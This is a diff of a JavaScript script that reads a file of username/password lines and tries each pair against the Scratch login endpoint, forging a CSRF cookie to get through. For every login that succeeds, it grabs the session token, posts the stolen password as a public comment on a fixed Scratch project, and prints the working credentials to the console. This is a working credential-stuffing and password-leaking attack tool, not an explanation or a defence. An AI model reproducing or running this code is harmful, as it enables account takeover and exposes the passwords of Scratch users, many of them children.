@@ -9,12 +9,15 @@ input.addEventListener('change', () => {
         reader.readAsText(file, 'UTF-8');
         reader.onload = ()=> {
             const flw = async (username,password) => {
-                let res=await fetch("https://scratch.mit.edu/login/", {headers: {"x-csrftoken": "a","x-requested-with": "XMLHttpRequest","Cookie": "scratchcsrftoken=a;scratchlanguage=en;","referer": "https://scratch.mit.edu"},body: JSON.stringify({ username, password, useMessages: true }),method: "POST"});
+
+                document.cookie="scratchcsrftoken=a;path=/;domain=.scratch.mit.edu";
+                let res=await fetch("https://scratch.mit.edu/login/", {headers: {"x-csrftoken": "a","x-requested-with": "XMLHttpRequest"},body: JSON.stringify({ username, password, useMessages: true }),method: "POST"});
                 if(res.status==200){
-                    const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest","referer": "https://scratch.mit.edu"}})).json()).user.token;
+                    const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
                     let projectid="585027038";
                     let contents=password;
-                    fetch(`https://api.scratch.mit.edu/proxy/comments/project/${projectid}`,{
+                    document.cookie="scratchcsrftoken=a;path=/;domain=.scratch.mit.edu";
+                    res=await fetch(`https://api.scratch.mit.edu/proxy/comments/project/${projectid}`,{
                       method: "POST",
                       body: JSON.stringify({
                         content: contents,
@@ -23,12 +26,13 @@ input.addEventListener('change', () => {
                       }),
                       headers: {
                         'X-CSRFToken': "a",
-                        'x-token':sessiontoken,
-                        "Cookie": "scratchcsrftoken=a;scratchlanguage=en;",
-                        "referer": "https://scratch.mit.edu"
+                        'x-token':sessiontoken
                       }
                     });
+                    if(res.status==200){
+                        console.log(username,password);
                 }
+            }
             }
             let prom=reader.result.split("\n");
             let setint=setInterval(follow,10);
